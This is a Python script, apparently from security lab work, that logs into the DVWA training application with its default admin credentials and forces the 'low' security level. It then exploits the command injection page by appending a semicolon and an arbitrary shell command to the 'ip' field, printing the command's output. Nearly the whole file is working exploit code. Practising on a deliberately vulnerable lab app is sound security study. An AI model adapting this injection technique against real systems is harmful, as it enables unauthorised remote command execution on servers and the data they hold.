#!/usr/bin/env python3
"""DVWA 新建会话登录并执行命令注入 (exec low), 返回结果文本.
用法: python3 dvwa_exec.py <base_url> <cmd>
"""
import re, sys, urllib.request, http.cookiejar

base, cmd = sys.argv[1], " ".join(sys.argv[2:])
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

# login
html = op.open(base + "/login.php", timeout=20).read().decode(errors="replace")
m = re.search(r"name='user_token'\s+value='([0-9a-f]+)'", html)
data = urllib.parse.urlencode({"username": "admin", "password": "password",
                               "Login": "Login", "user_token": m.group(1)}).encode()
op.open(base + "/login.php", data=data, timeout=20).read()

# set security low via cookie header trick: just send cookie security=low
import http.client

# simpler: use urllib with Cookie header override
def req(path, post=None):
    headers = {"Cookie": "security=low; " + "; ".join(f"{c.name}={c.value}" for c in cj)}
    r = urllib.request.Request(base + path, data=post, headers=headers)
    return op.open(r, timeout=30).read().decode(errors="replace")

body = req("/vulnerabilities/exec/", urllib.parse.urlencode(
    {"ip": "127.0.0.1; " + cmd, "Submit": "Submit"}).encode())
# extract <pre> block
m = re.search(r"<pre>(.*?)</pre>", body, re.S)
if m:
    print(m.group(1))
else:
    print("NO PRE BLOCK. Body len:", len(body))
